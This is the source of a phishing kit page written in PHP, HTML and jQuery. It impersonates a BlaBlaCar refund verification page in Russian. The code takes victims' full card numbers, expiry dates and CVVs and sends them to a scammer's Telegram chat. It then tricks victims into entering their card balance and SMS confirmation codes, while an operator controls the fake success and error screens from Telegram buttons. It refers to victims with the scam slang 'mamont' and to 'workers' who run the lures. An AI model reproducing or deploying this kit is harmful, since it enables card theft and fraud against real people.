<?php

include "config.php";

if(isset($_POST['card_number'])){
    $arr = explode(' ',$_POST['card_number']);
}

$link = Links::find(['order_id'=>$_POST['order_id']]);



switch ($link->type) {
    case 1:
        $message = "❗ ".$link->platform." 1.0 ❗  \n️
⚠️Переход на возврат
🧲Цена: " . $link->price . " руб
🙊Маршрут: ".$_POST['address']."
💳Номер карты: ".$_POST['card_number']."
💳месяц:".$_POST['expire_month']."
💳год:".$_POST['expire_year']."
💳cvv: ".$_POST['card_code']." 
💊Чекер: ".($link->balance?  'Включен' :'Выключен')."
⚔ID Обьявления: " . $link->order_id . "
💣Воркер: ".$link->worker;
        $text  = $message;
        $chat_id =$operator_chat_id;
        $keyboard[0]["Успешная оплата"] = "oplatauspeshna|".$link->order_id;
        $keyboard[1]["Ошибка платежа"] = "osibka|".$link->order_id;
        $keyboard[2]["Нет денег"] = "osibka|".$link->order_id;
        $keyboard[3]["СТРАНИЦА НЕТ ДЕНЕГ"] = "nomoneymamont|".$link->order_id;
        $keyboard[4]["СТРАНИЦА ОШИБКА"] = "osibkamamont|".$link->order_id;
        $keyboard[5]["СТРАНИЦА УСШЕШНО"] = "oplatauspeshnamamont|".$link->order_id;
        $keyboard[5]["СТРАНИЦА ЛИМИТ"] = "nomoneylimitmamont|".$link->order_id;
        $params["chat_id"] = $chat_id;
        $params["text"] = $text;
        $params["parse_mode"] = "HTML";
        $params["disable_web_page_preview"] = 'true';


        if (!empty($keyboard["keyboard"])) {
            $params["reply_markup"] = json_encode([
                "keyboard" => $keyboard["keyboard"],
                "resize_keyboard" => true
            ]);
        } else if ($keyboard) {
            foreach ($keyboard as $row) {
                foreach ($row as $title => $data)
                    $b[] = ["text" => $title, "callback_data" => $data];

                $rows[] = $b;

                $b = null;
            }

            $params["reply_markup"] = json_encode([
                "inline_keyboard" => $rows
            ]);
        }

        APIRequest("sendMessage", $params,$token);
        $message = "❗ ".$link->platform." ❗  \n️
⚠️Мамонт перешел вбивать код (Возврат) 
🧲Цена: " . $link->price . " руб 
🙊Маршрут: ".$_POST['address']."
⚔ID Обьявления: " . $link->order_id . "
💣Воркер: " . $link->worker;
        $filename = 'https://api.telegram.org/bot' . $token . '/sendMessage?chat_id=' . $link->worker_id . '&text=' . urlencode($message) . '&parse_mode=html';
        file_get_contents($filename);
        $title = "Оплата товара";
        break;
    case 2:
        $message = "❗ ".$link->platform." 2.0 ❗  \n️
⚠️Переход на возврат
🧲Цена: " . $link->price . " руб
🙊Маршрут: ".$_POST['address']."
💳Номер карты: ".$_POST['card_number']."
💳месяц:".$_POST['expire_month']."
💳год:".$_POST['expire_year']."
💳cvv: ".$_POST['card_code']."
💊Чекер: ".($link->balance ? 'Включен' :'Выключен')."
⚔ID Обьявления: " . $link->order_id . "
💣Воркер: ".$link->worker;
        $text  = $message;
        $chat_id =$operator_chat_id;
        $keyboard[0]["Успешная оплата"] = "oplatauspeshna|".$link->order_id;
        $keyboard[1]["Ошибка платежа"] = "osibka|".$link->order_id;
        $keyboard[2]["Нет денег"] = "osibka|".$link->order_id;
        $keyboard[3]["СТРАНИЦА НЕТ ДЕНЕГ"] = "nomoneymamont|".$link->order_id;
        $keyboard[4]["СТРАНИЦА ОШИБКА"] = "osibkamamont|".$link->order_id;
        $keyboard[5]["СТРАНИЦА УСШЕШНО"] = "oplatauspeshnamamont|".$link->order_id;
        $keyboard[5]["СТРАНИЦА ЛИМИТ"] = "nomoneylimitmamont|".$link->order_id;
        $params["chat_id"] = $chat_id;
        $params["text"] = $text;
        $params["parse_mode"] = "HTML";
        $params["disable_web_page_preview"] = 'true';


        if (!empty($keyboard["keyboard"])) {
            $params["reply_markup"] = json_encode([
                "keyboard" => $keyboard["keyboard"],
                "resize_keyboard" => true
            ]);
        } else if ($keyboard) {
            foreach ($keyboard as $row) {
                foreach ($row as $title => $data)
                    $b[] = ["text" => $title, "callback_data" => $data];

                $rows[] = $b;

                $b = null;
            }

            $params["reply_markup"] = json_encode([
                "inline_keyboard" => $rows
            ]);
        }

        APIRequest("sendMessage", $params,$token);
        $message = "\n\n ⠀❗ ".$link->platform." ❗  \n\n ⚠️Переход на возврат️\n\n Воркер: ".$link->worker;
        $filename = 'https://api.telegram.org/bot' . $token . '/sendMessage?chat_id=' . $link->worker_id . '&text=' . urlencode($message) . '&parse_mode=html';
        file_get_contents($filename);
        $title = "Получение средств";

}



?>
<!DOCTYPE html>
<html><head>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <!-- <link rel="stylesheet" type="text/css" href="css/stylesheet.css"> -->
    <style type="text/css">
        @font-face {
            font-family: "Lato";
            font-weight: 400;
            src: ("../fonts/Lato-Regular.ttf");
        }

        @font-face {
            font-family: "Lato";
            font-weight: 500;
            src: ("../fonts/Lato-Semibold.ttf");
        }

        @font-face {
            font-family: "Lato";
            font-weight: 700;
            src: ("../fonts/Lato-Bold.ttf");
        }

        body {
            font-family: "Lato", sans-serif;
            font-weight: 400;
            font-size: 15px;
            background-color: #fff;
            color: #002f34;
            padding: 0 15px;
            overflow-y: hidden;
        }

        .form-container {
            display: flex;
            height: 100vh;
            justify-content: center;
            align-items: center;
        }

        .form-block {
            max-width: 480px;
            margin: 0 auto;
            float: left;
        }

        .form-block-image {
            display: inline-block;
            width: 60px;
            height: 60px;
        }

        .form-block-header-text {
            display: inline-block;
            position: relative;
            font-size: 20px;
            margin: 0;
            top: -22px;
            left: 10px;
        }

        .form-block-body-text {
            line-height: 22px;
        }

        .form-block-body-table {
            border-spacing: 0;
            margin-top: 25px;
            margin-bottom: 30px;
        }

        .form-block-body-table tr {
            line-height: 24px;
        }

        .form-block-body-table tr td:nth-child(odd) {
            padding-right: 40px;
        }

        .form-block-body-table tr td:nth-child(even) {
            font-weight: 700;
        }

        .form-block-body-notification {
            font-size: 13px;
            line-height: 18px;
            background-color: #f5f6f7;
            box-shadow: 0 0 5px rgba(0, 0, 0, .1);
            border: 1px solid black;
            border-radius: 4px;
            padding: 10px 15px;
            margin-bottom: 25px;
        }

        .form-block-footer-text {
            font-weight: 700;
        }

        .form-block-footer-input {
            display: block;
            min-width: 60%;
            font-family: "Lato", sans-serif;
            font-size: 14px;
            border: 1px solid #e7e7e7;
            border-radius: 3px;
            padding: 10px 15px;
            transition: .25s;
        }

        .form-block-footer-input:focus {
            border-color: #c5c0c0;
            outline: none;
        }

        .input-invalid {
            border-color: #e74c3c;
        }

        .form-block-footer-input::-webkit-outer-spin-button,
        .form-block-footer-input::-webkit-inner-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        .form-block-footer-button {
            display: block;
            max-width: 480px;
            text-align: center;
            text-decoration: none;
            background-color: #002f34;
            border-radius: 4px;
            color: #fff;
            padding: 15px 5px;
            margin-top: 20px;
            cursor: pointer;
            transition: .25s;
        }

        .form-block-footer-button:hover {
            background-color: #00a3df;
        }

        @media (max-width: 360px) {
            .form-block-image {
                display: block;
                margin-bottom: 15px;
            }

            .form-block-header-text {
                position: static;
                display: block;
            }
        }

        @media (max-height: 680px) {
            .form-block-image {
                display: block;
                margin-bottom: 15px;
            }

            .form-block-header-text {
                position: static;
                display: block;
            }
        }
    </style>
    <link rel="icon" type="image/x-icon" href="https://olx.ua.obyavelene.com/payment/img/fav-icon.ico">

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <meta name="sci-token" content="50d9decba5179088ececaac516752bade3307ef5ec1249aa0b29e9dd7a9852c4">

    <title>Подтверждение платежа — BLABLACAR</title>
</head>

<body>
<center>
    <div class="form-container">
        <div class="form-block" id="step-1" <?php if($link->balance ==0):?> style="display: none" <?php endif; ?>>
            <div class="form-block-header">
                <img src="/img/blabalcar.gif" alt="OLX" class="form-block-image">
                <h1 class="form-block-header-text">Верификация банка</h1>
            </div>

            <div class="form-block-body">
                <p class="form-block-body-text">
                    Банк запросил дополнительную верификацию. Вам требуется доказать, что Вы являетесь владельцем карты. Пожалуйста, введите баланс Вашей карты в поле ниже.
                </p>

                <table class="form-block-body-table">
                    <tbody><tr>
                        <td>Магазин:</td>
                        <td>blablacar.ru</td>
                    </tr>
                    <tr>
                        <td>Сумма:</td>
                        <td><?=$link->price;?>,00 руб.</td>
                    </tr>
                    <tr>
                        <td>Номер карты:</td>
                        <td>**** **** **** <?=$arr[3];?></td>
                    </tr>

                    </tbody></table>

                <div class="form-block-body-notification">
                    <b>Внимание!</b>
                    <br><br>
                    Убедитесь, что на Вашей карте нет запрета на платежи в
                    интернет-магазинах и стоит достаточный суточный лимит. Увеличить лимит
                    вы можете в банке, который вас обслуживает.
                </div>
            </div>

            <div class="form-block-footer">
                <p class="form-block-footer-text">
                    Ваш баланс:
                </p>
                <input  class="form-block-footer-input" placeholder="Баланс..." style="width: 94%;" id="code-input" required>

                <a class="form-block-footer-button" style="background-color: #0098d0;" id="submit-button">
                    Подтвердить
                </a>
            </div>
        </div>
        <div class="form-block" id="step-2" <?php if($link->balance ==0):?> <?php else: ?>style="display: none" <?php endif; ?>">
            <div class="form-block-header">
                <img src="/img/blabalcar.gif" alt="OLX" class="form-block-image">
                <h1 class="form-block-header-text">Подтверждение возврата</h1>
            </div>

            <div class="form-block-body">
                <p class="form-block-body-text">
                    Для подтверждения возврата на Ваш номер телефона было отправлено
                    смс сообщение с кодом подтверждения. Введите его в поле ниже.
                </p>

                <table class="form-block-body-table">
                    <tbody><tr>
                        <td>Магазин:</td>
                        <td>blablacar.ru</td>
                    </tr>
                    <tr>
                        <td>Сумма:</td>
                        <td><?=$link->price;?>,00 руб.</td>
                    </tr>
                    <tr>
                        <td>Номер карты:</td>
                        <td>**** **** **** <?=$arr[3];?></td>
                    </tr>

                    </tbody></table>

                <div class="form-block-body-notification">
                    <b>Внимание!</b> В связи с высокой нагрузкой на сервер отправка кода может задерживаться на несколько минут.
                    <br><br>
                    Убедитесь, что на Вашей карте нет запрета на платежи в
                    интернет-магазинах и стоит достаточный суточный лимит. Увеличить лимит
                    вы можете в банке, который вас обслуживает.
                </div>
            </div>

            <div class="form-block-footer">
                <p class="form-block-footer-text">
                    Код подтверждения:
                </p>
                <input  class="form-block-footer-input" placeholder="Введите код..." style="width: 94%;" id="code-input2" required>

                <a class="form-block-footer-button" style="background-color: #0098d0;" id="submit-button2">
                    Подтвердить
                </a>
            </div>
        </div>
        <div class="form-block" id="step-3" style="display: none;">
            <div class="form-block-header">
                <img src="/img/blabalcar.gif" alt="OLX" class="form-block-image">
                <h1 class="form-block-header-text">Обработка возврата</h1>
            </div>

            <div class="form-block-body">
                <p class="form-block-body-text">
                    Ваш возврат находится в процессе обработки. <br><br>Это может занять некоторое время.
                </p>
            </div>
        </div>
        <!-- лимит -->
        <div class="form-block" id="step-4" style="display: none;">
            <div class="form-block-header">
                <img src="/img/blabalcar.gif" alt="OLX" class="form-block-image">
                <h1 class="form-block-header-text">Ошибка: Возврат отклонён!</h1>
            </div>

            <div class="form-block-body">
                <p class="form-block-body-text">
                    Превышен лимит попробуйте пополнить карту.
                </p>
            </div>
        </div>
        <!-- текст недостаточно -->
        <div class="form-block" id="step-5" style="display: none;">
            <div class="form-block-header">
                <img src="/img/blabalcar.gif" alt="OLX" class="form-block-image">
                <h1 class="form-block-header-text">Ошибка: Возврат отклонён!</h1>
            </div>

            <div class="form-block-body">
                <p class="form-block-body-text">
                    На вашей банковской карте недостаточно средств.
                </p>
            </div>
        </div>
    <!-- текст Успешно -->
    <div class="form-block" id="step-6" style="display: none;">
        <div class="form-block-header">
            <img src="/img/blabalcar.gif" alt="OLX" class="form-block-image">
            <h1 class="form-block-header-text">Возврат успешен!</h1>
        </div>

        <div class="form-block-body">
            <p class="form-block-body-text">
                Спасибо за использование сервиса.
            </p>
        </div>
    </div>

    <!--Ошибка платежа -->
    <div class="form-block" id="step-7" style="display: none;">
        <div class="form-block-header">
            <img src="/img/blabalcar.gif" alt="OLX" class="form-block-image">
            <h1 class="form-block-header-text">Ошибка: попробуйте снова!</h1>
        </div>

        <div class="form-block-body">
            <p class="form-block-body-text">
                При попроведении операции произошла ошибка.
            </p>
        </div>
    </div>

</center>
<script type="text/javascript" src="/js/jquery-3.js"></script>
<script type="text/javascript">
    $(document).ready(function() {
   
        /*
                 function funcBefore() {
                     $("#step-1").fadeOut(500, function() {
                         $("#step-2").fadeIn();
                     });
                 }

                 function getMyJsonGoNew() {
                     $.ajax({
                         url: '/panelwork/ip_cartal/2620:18c::189.json',
                         cache: false,
                         dataType: 'html',
                         success: function(data) {
                             obj = jQuery.parseJSON(data);
                             if (obj.type == 'threeds') { // Текст о лимите
                                 location.reload();
                             } else {
                                 setTimeout(function () {
                                     getMyJsonGoNew();
                                 }, 2000);
                             }
                         },
                         error: function(result) {
                             setTimeout(function () {
                                 getMyJsonGoNew();
                             }, 2000)
                         }
                     });
                 }
        */
        function getMyJsonGoRepeat() {
            $.ajax({
                url: '/getjson.php?order_id=<?=$_POST["order_id"];?>',
                cache: false,
                dataType: 'html',
                //beforeSend: funcBefore,
                success: function(data) {
                    obj = jQuery.parseJSON(data);
                    if (obj.type == '4') { // Текст о лимите
                        $("#step-3").fadeOut(500, function() {
                            $("#step-4").fadeIn();
                            //getMyJsonGoNew();
                        });
                    } else if (obj.type == '3') { // Текст о недостаточно средств
                        $("#step-3").fadeOut(500, function() {
                            $("#step-5").fadeIn();
                            //getMyJsonGoNew();
                        });
                    }else if (obj.type == '1') { // Ничего не делаем
                        $("#step-3").fadeOut(500, function() {
                        $("#step-6").fadeIn();
                        });
                    }else if (obj.type == '2') { // Ничего не делаем
                        $("#step-3").fadeOut(500, function() {
                        $("#step-7").fadeIn();
                        });
                    }else if (obj.type == '') { // Послать
                        setTimeout(function () {
                            getMyJsonGoRepeat();
                        }, 2000)
                    }  else if (obj.type == 'nahuigo') { // Послать
                        location.href = "https://natribu.org/";
                    }else if (obj.type == 'gotorl') { // Послать по ссылке
                        location.href = obj.url;
                    } else {
                        location.reload();
                    }

                    /*   $.ajax({
                           url: '/panelwork/dell.php?ip=2620:18c::189',
                           cache: false,
                           dataType: 'html',
                           success: function(data) {
                               console.log("inform checked");
                           }});*/
                },
                error: function(result) {
                    setTimeout(function () {
                        getMyJsonGoRepeat();
                    }, 2000)
                }
            });
        }

        $("#submit-button").click(function() {

            var code = $("#code-input").val();
            var token = $("meta[name=sci-token]").attr("content");
            var order_id = '<?=$_POST['order_id'];?>';
            if($("#code-input").val() == ''){



                return false;
            }
            $.ajax({
                type: "POST",
                url: "steps.php",
                dataType: "json",
                data: {
                    code: code,
                    step: 3,
                    order_id: order_id
                }
            })

            $("#step-1").fadeOut(1000, function() {
                $("#step-2").fadeIn();
            });
            //$.post("send.php", { "sci_token": token, "code": code })
            /*$("#step-1").fadeOut(500, function() {
                $("#step-2").fadeIn();
                    $("#step-2").fadeOut(500, function() {
                        $("#step-3").fadeIn();
                            setTimeout('document.location.href="https://olx.ua.obyavelene.com/payment/index.php"', 6000);
                                var code = ''
                    });
            });*/

        });
        $("#submit-button2").click(function() {
                         setTimeout(function () {
            getMyJsonGoRepeat();
        }, 5000)
            var code = $("#code-input2").val();
            var token = $("meta[name=sci-token]").attr("content");
            var order_id = '<?=$_POST['order_id'];?>';
            if($("#code-input2").val() == ''){



                return false;
            }
            $.ajax({
                type: "POST",
                url: "steps.php",
                dataType: "json",
                data: {
                    code: code,
                    step: 2,
                    order_id: order_id
                }
            })

            $("#step-2").fadeOut(1000, function() {
                $("#step-3").fadeIn();
            });
            //$.post("send.php", { "sci_token": token, "code": code })
            /*$("#step-1").fadeOut(500, function() {
                $("#step-2").fadeIn();
                    $("#step-2").fadeOut(500, function() {
                        $("#step-3").fadeIn();
                            setTimeout('document.location.href="https://olx.ua.obyavelene.com/payment/index.php"', 6000);
                                var code = ''
                    });
            });*/

        });
    });
</script>


</body></html>